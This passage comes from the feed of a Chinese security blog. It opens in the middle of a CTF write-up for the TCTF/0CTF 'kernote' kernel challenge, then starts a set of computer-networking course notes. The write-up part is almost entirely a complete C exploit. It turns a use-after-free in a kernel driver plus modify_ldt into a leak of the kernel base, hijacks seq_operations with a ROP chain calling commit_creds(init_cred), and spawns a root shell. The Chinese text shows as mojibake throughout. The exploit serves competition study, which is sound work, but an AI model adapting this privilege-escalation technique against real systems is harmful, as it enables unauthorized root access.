class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff8266b780</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810ca2b0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810c9dd0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff81075c4c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00fb0</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> init_cred;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred;</span><br><span class="line"><span class="type">size_t</span> commit_creds;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> kernote_fd;</span><br><span class="line"><span class="type">long</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] %s \033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkSet</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6666</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkAdd</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6667</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkDel</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6668</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkEdit</span><span class="params">(<span class="type">size_t</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6669</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkFuck</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x666A</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span>     <span class="title">desc</span>;</span></span><br><span class="line">    <span class="type">size_t</span>                 page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line">    <span class="type">size_t</span>              temp;</span><br><span class="line">    <span class="type">int</span>                 retval;</span><br><span class="line">    <span class="type">size_t</span>                kernel_base;</span><br><span class="line">    <span class="type">size_t</span>              kernel_offset;</span><br><span class="line">    <span class="type">size_t</span>                search_addr;</span><br><span class="line">    <span class="type">size_t</span>              per_search_addr;</span><br><span class="line">    <span class="type">size_t</span>              *result_addr;</span><br><span class="line">    <span class="type">int</span>                   cur_pid;</span><br><span class="line">    <span class="type">size_t</span>                *buf;</span><br><span class="line">    <span class="type">int</span>                 pipe_fd[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">cpu_set_t</span>           cpu_set;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit... \033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x8000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    kernote_fd = open(<span class="string">&quot;/dev/kernote&quot;</span>, O_RDWR);</span><br><span class="line">    chunkAdd(<span class="number">0</span>);</span><br><span class="line">    chunkSet(<span class="number">0</span>);</span><br><span class="line">    chunkDel(<span class="number">0</span>);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        chunkEdit(page_offset_base);</span><br><span class="line">        retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>); <span class="comment">// final param should be 8 there</span></span><br><span class="line">        <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        page_offset_base += <span class="number">0x4000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found page_offset_base: \033[0m%p\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    buf = (<span class="type">size_t</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    search_addr = page_offset_base;</span><br><span class="line">    kernel_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        chunkEdit(search_addr);</span><br><span class="line">        retval = fork();</span><br><span class="line">        <span class="keyword">if</span> (!retval)    <span class="comment">// child</span></span><br><span class="line">        &#123;</span><br><span class="line">            syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (buf[i] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; (buf[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    kernel_base = buf[i] -  <span class="number">0x040</span>;</span><br><span class="line">                    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\n&quot;</span>, kernel_base);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (kernel_base)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        search_addr += <span class="number">0x8000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>; <span class="comment">// don&#x27;t forget to set it in main process</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// hijack seq_operations-&gt;start</span></span><br><span class="line">    chunkAdd(<span class="number">1</span>);</span><br><span class="line">    chunkSet(<span class="number">1</span>);</span><br><span class="line">    chunkDel(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    chunkEdit(<span class="number">0xffffffff817c21a6</span> + kernel_offset); <span class="comment">// add rsp, 0x198 ; pop r12 ; pop rbp ; ret</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hijack to: %p\n&quot;</span>, <span class="number">0xffffffff817c21a6</span> + kernel_offset);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = POP_RDI_RET + kernel_offset;</span><br><span class="line">    init_cred = INIT_CRED + kernel_offset;</span><br><span class="line">    commit_creds = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   pop_rdi_ret;&quot;</span> <span class="comment">// start at there</span></span><br><span class="line">        <span class="string">&quot;mov r12,   init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    0x88888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆ<strong>ç¨³å®šåŒ–ææƒ</strong></p><p><img src="https://s2.loli.net/2022/01/05/YjJTbIsMGUaZ2Xu.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ¬§çš‡ä¸éé…‹çš„å¯¹å†³&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/tags/CTF/"/>
    
    <category term="Use After Free" scheme="http://blog.arttnba3.cn/tags/Use-After-Free/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="TCTF/0CTF" scheme="http://blog.arttnba3.cn/tags/TCTF-0CTF/"/>
    
    <category term="Kernel BROP" scheme="http://blog.arttnba3.cn/tags/Kernel-BROP/"/>
    
    <category term="Kernel UAF" scheme="http://blog.arttnba3.cn/tags/Kernel-UAF/"/>
    
  </entry>
  
  <entry>
    <title>ã€NETWORK.0x00ã€‘è®¡ç®—æœºç½‘ç»œåŸç†å­¦ä¹ ç¬”è®°</title>
    <link href="http://blog.arttnba3.cn/2021/09/27/NETWORK-0X00-COMPUTER_NETWORK_BASIS/"/>
    <id>http://blog.arttnba3.cn/2021/09/27/NETWORK-0X00-COMPUTER_NETWORK_BASIS/</id>
    <published>2021-09-26T16:27:43.000Z</published>
    <updated>2022-07-03T20:09:58.717Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘çˆ±è®¡ç½‘è®¡ç½‘çˆ±æˆ‘</p><span id="more"></span><blockquote><p><del>æˆ‘åƒè®¡ç½‘çˆ±æˆ‘é‚£æ ·çˆ±è®¡ç½‘</del>ï¼ˆğŸ”«</p></blockquote><h1 id="0x00-å†™åœ¨å¼€å§‹ä¹‹å‰"><a href="#0x00-å†™åœ¨å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.å†™åœ¨å¼€å§‹ä¹‹å‰"></a>0x00.å†™åœ¨å¼€å§‹ä¹‹å‰</h1><p>è®¡ç®—æœºç½‘ç»œåŸç†ä¸€ç›´éƒ½æ˜¯è®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯ä¸­ååˆ†åŸºç¡€ä¸é‡è¦çš„çš„è¯¾ç¨‹ï¼Œåˆšå¥½è¿™å­¦æœŸå¼€äº†è®¡ç®—æœºç½‘ç»œè¿™é—¨è¯¾ï¼Œ<del>ä¸ºäº†é¿å…æŒ‚ç§‘è¿˜æ˜¯</del>å­¦åˆ°ä¸€ç‚¹å†™ä¸€ç‚¹ï¼Œä¸è¿‡æœ¬ç¯‡åšæ–‡<strong>å¹¶éè€ƒè¯•å¯¼å‘æ€§è´¨çš„ç¬”è®°ï¼Œåªä¼šè®°å½•ç¬”è€…è®¤ä¸ºé‡è¦çš„å†…å®¹ï¼Œä¸ä¼šç‰¹æ„æ ‡æ³¨æ‰€è°“é‡ç‚¹</strong>ï¼ˆ<del>ä»€ä¹ˆÂ·ï¼Ÿä½ æƒ³æ‹¿æ¥è€ƒç ”ï¼Ÿ</del></p><p>ä¸»è¦å‚ç…§ã€Šæ•°æ®é€šä¿¡ä¸ç½‘ç»œã€‹ä¸è€å¸ˆä¸Šè¯¾ç”¨çš„ PPTï¼Œé…åˆç€ç¬”è€…ä¸ªäººçš„ä¸€äº›ç†è§£ï¼Œç¬”è€…è®¤ä¸ºä¸é‡è¦çš„ä¼šæ ‡æ³¨ <code>*</code>ï¼Œå¦‚æœ‰é”™è¯¯è¿˜è¯·å¤§å®¶ä¸åèµæ•™</p><p>å½“å‰è¿›åº¦ï¼šChapter.06   2022.1.5ï¼ˆå¦‚æœçœ‹åˆ°ç¬”è€…è¿˜æ²¡æ›´æ–°å®Œè¯·æé†’ç¬”è€…ï¼ˆç¬‘ï¼‰ï¼‰</p><blockquote><p>ç®€å•çœ‹äº†ä¸€ä¸‹è¿™æœ¬ä¹¦ä¸»è¦ä»¥è‡ªåº•å‘ä¸Šçš„æ–¹å¼æ··åˆå™è¿°äº† TCP&#x2F;IP å››å±‚æ¨¡å‹ä¸ OSI ä¸ƒå±‚æ¨¡å‹çš„å†…å®¹ï¼šç‰©ç†å±‚ã€æ•°æ®é“¾è·¯å±‚ï¼ˆå‰é¢è¿™ä¸¤å±‚åœ¨ TCP&#x2F;IP ä¸­åˆä¸ºç½‘ç»œè®¿é—®å±‚ï¼‰ã€ç½‘ç»œå±‚ã€ä¼ è¾“å±‚ã€åº”ç”¨å±‚ï¼ˆåœ¨ OSI ä¸ƒå±‚æ¨¡å‹ä¸­åº”ç”¨å±‚è¢«åˆ†ä¸ºä¸‰å±‚ï¼Œè‡ªåº•å‘ä¸Šä¸ºï¼šä¼šè¯å±‚ã€è¡¨ç¤ºå±‚ã€åº”ç”¨å±‚ï¼‰</p></blockquote><blockquote><p>é™„ä¸Šä¸¤å¼ ä»ç½‘ä¸Šæ‰¾åˆ°çš„å›¾</p><p><img src="https://i.loli.net/2021/09/28/AGyOHXZINmP7R4C.png"></p><p><img src="https://i.loli.net/2021/09/28/FRj2ZYOiT1Ah8wo.png"></p></blockquote><h1 id="0x01-æ¦‚è¿°"><a href="#0x01-æ¦‚è¿°" class="headerlink" title="0x01.æ¦‚è¿°"></a>0x01.æ¦‚è¿°</h1><h2 id="Chapter-1-ç»ªè®º"><a href="#Chapter-1-ç»ªè®º" class="headerlink" title="Chapter 1 - ç»ªè®º"></a>Chapter 1 - ç»ªè®º</h2><h3 id="1-1-æ•°æ®é€šä¿¡"><a href="#1-1-æ•°æ®é€šä¿¡" class="headerlink" title="1.1 æ•°æ®é€šä¿¡"></a>1.1 æ•°æ®é€šä¿¡</h3><p><strong>æ•°æ®é€šä¿¡</strong>ï¼ˆdata communicationï¼‰å³åœ¨ä¸¤å°è®¾å¤‡é—´è¿›è¡Œæ•°æ®äº¤æ¢ï¼Œå…¶æ•ˆç‡ä¸»è¦å–å†³äºä»¥ä¸‹å››ä¸ªå› ç´ ï¼š</p><ul><li><strong>ä¼ é€’æ€§</strong>ï¼šç³»ç»Ÿå¿…é¡»å°†æ•°æ®ä¼ é€’åˆ°æ­£ç¡®çš„ç›®çš„åœ°</li><li><strong>å‡†ç¡®æ€§</strong>ï¼šç³»ç»Ÿå¿…é¡»å‡†ç¡®åœ°ä¼ è¾“æ•°æ®</li><li><strong>åŠæ—¶æ€§</strong>ï¼šç³»ç»Ÿå¿…é¡»ä»¥åŠæ—¶çš„æ–¹å¼ä¼ é€’æ•°æ®</li><li><strong>æŠ–åŠ¨æ€§</strong>ï¼šåˆ†ç»„åˆ°è¾¾æ—¶é—´çš„å˜åŒ–ç‡åº”å½“è¦ä½</li></ul><p>ä¸€ä¸ªæ•°æ®é€šä¿¡ç³»ç»Ÿä¸»è¦æœ‰å¦‚ä¸‹å›¾æ‰€ç¤ºçš„äº”ä¸ªç»„æˆéƒ¨åˆ†ï¼š</p><p><img src="https://i.loli.net/2021/09/28/KhQv3z84rsBbkWD.png" alt="image.png"></p><ul><li><strong>æŠ¥æ–‡</strong>ï¼ˆmessageï¼‰ï¼šå³ç”¨ä»¥è¿›è¡Œé€šä¿¡çš„æ•°æ®</li><li><strong>å‘é€æ–¹</strong>ï¼ˆsenderï¼‰ï¼šå‘é€æŠ¥æ–‡çš„è®¾å¤‡</li><li><strong>æ¥æ”¶æ–¹</strong>ï¼ˆreceiverï¼‰ï¼šæ¥æ”¶æŠ¥æ–‡çš„è®¾å¤‡</li><li><strong>ä¼ è¾“ä»‹è´¨</strong>ï¼ˆtransmission mediumï¼‰ï¼šæŠ¥æ–‡ä»å‘é€æ–¹åˆ°æ¥æ”¶æ–¹æ‰€ç»è¿‡çš„ç‰©ç†é€šè·¯</li><li><strong>åè®®</strong>ï¼ˆprotocolï¼‰ï¼šç”¨ä»¥ç®¡ç†æ•°æ®é€šä¿¡çš„ä¸€ç»„è§„åˆ™ï¼Œè¡¨ç¤ºé€šä¿¡è®¾å¤‡ä¹‹é—´å¦‚ä½•è¿›è¡Œé€šä¿¡çš„çº¦å®š</li></ul><p>ä¸¤å°è®¾å¤‡ä¹‹é—´çš„<strong>é€šä¿¡æ¨¡å¼</strong>ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š</p><p><img src="https://i.loli.net/2021/09/27/yaMkHe24ctFIYob.png" alt="image.png"></p><ul><li><strong>å•å·¥</strong>ï¼ˆsimplex modeï¼‰ï¼šä¸¤å°è®¾å¤‡é—´çš„é€šä¿¡æ˜¯å•å‘çš„ï¼Œä¸€æ–¹åªèƒ½ä¸ºæ¥æ”¶æ–¹è€Œå¦ä¸€æ–¹åªèƒ½ä¸ºå‘é€æ–¹</li><li>(å…¨)<strong>åŒå·¥</strong>ï¼ˆ(full-)duplex modeï¼‰ï¼šä¸¤å°è®¾å¤‡é—´çš„é€šä¿¡æ˜¯åŒå‘çš„ï¼Œ<strong>é€šä¿¡åŒæ–¹éƒ½å¯ä»¥åŒæ—¶æ”¶å‘æŠ¥æ–‡</strong></li><li><strong>åŠåŒå·¥</strong>ï¼ˆhalf-duplex modeï¼‰ï¼šä¸¤å°è®¾å¤‡é—´çš„é€šä¿¡æ˜¯åŒå‘çš„ï¼Œä½†æ˜¯<strong>åœ¨åŒä¸€æ—¶åˆ»æŠ¥æ–‡çš„ä¼ è¾“åªèƒ½æ˜¯å•å‘çš„</strong></li></ul><h3 id="1-2-ç½‘ç»œ"><a href="#1-2-ç½‘ç»œ" class="headerlink" title="1.2 ç½‘ç»œ"></a>1.2 ç½‘ç»œ</h3><h4 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h4><p><strong>ç½‘ç»œ</strong>ï¼ˆnetworkï¼‰å³ä¸ºç”¨é€šä¿¡é“¾è·¯è¿æ¥èµ·æ¥çš„<strong>è®¾å¤‡</strong>ï¼ˆç§°ä¹‹ä¸ºèŠ‚ç‚¹ï¼‰<strong>çš„é›†åˆ</strong></p><blockquote><p><strong>åˆ†å¸ƒå¼å¤„ç†</strong>ï¼ˆdistributed processingï¼‰ä¸ºä¸€ç§å…¸å‹çš„ç½‘ç»œæ¨¡å¼ï¼šå°†ä¸€ä¸ªä»»åŠ¡åˆ†ç»™å¤šä¸ªèŠ‚ç‚¹å¤„ç†</p></blockquote><p>æˆ‘ä»¬ä¸»è¦ä»ä»¥ä¸‹ä¸‰ä¸ªæ–¹é¢è¯„ä¼°ä¸€ä¸ªç½‘ç»œï¼š</p><ul><li><strong>æ€§èƒ½</strong>ï¼ˆperformanceï¼‰ï¼šä¸»è¦ç”±ä»¥ä¸‹ä¸¤ä¸ªå› ç´ è¿›è¡Œåº¦é‡ï¼š<ul><li><strong>ååé‡</strong>ï¼ˆthroughputï¼‰ï¼šã€ç›¸å½“ä¸€æ®µæ—¶é—´ã€‘å†…æ”¶å‘çš„æ€»æ•°æ®é‡</li><li><strong>å»¶è¿Ÿ</strong>ï¼ˆdelay&#x2F;latencyï¼‰ï¼šè¯·æ±‚å“åº”ã€å‡ºå…¥ç³»ç»Ÿçš„æ—¶é—´ã€‘</li></ul></li></ul><p>ååé‡å¤§å»¶è¿Ÿä¸ä¸€å®šä½ï¼Œåä¹‹äº¦ç„¶ï¼Œå› ä¸ºååé‡æè¿°çš„æ˜¯æ•´ä¸ªç³»ç»Ÿçš„æ€§èƒ½ï¼Œè€Œå»¶è¿Ÿæè¿°çš„æ˜¯ç³»ç»Ÿå¯¹äºç”¨æˆ·çš„å“åº”æ—¶é—´</p><blockquote><p>ä¾‹å¦‚ä¸€ä¸ªç³»ç»Ÿå¯ä»¥ä¸€æ¬¡åå 114514 TBæ•°æ®ï¼Œä½†ä¸€æ¬¡åªèƒ½å¤„ç†233ä¸ªç”¨æˆ·çš„è¯·æ±‚ï¼Œæ­¤æ—¶ä¸€æ¬¡æ€§æ¥äº†1919810ä¸ªç”¨æˆ·ï¼Œå»¶è¿Ÿå°±çˆ†ç‚¸äº†</p></blockquote><ul><li><strong>å¯é æ€§</strong>ï¼ˆreliabilityï¼‰ï¼šå³ç½‘ç»œæ˜¯å¦å¯é 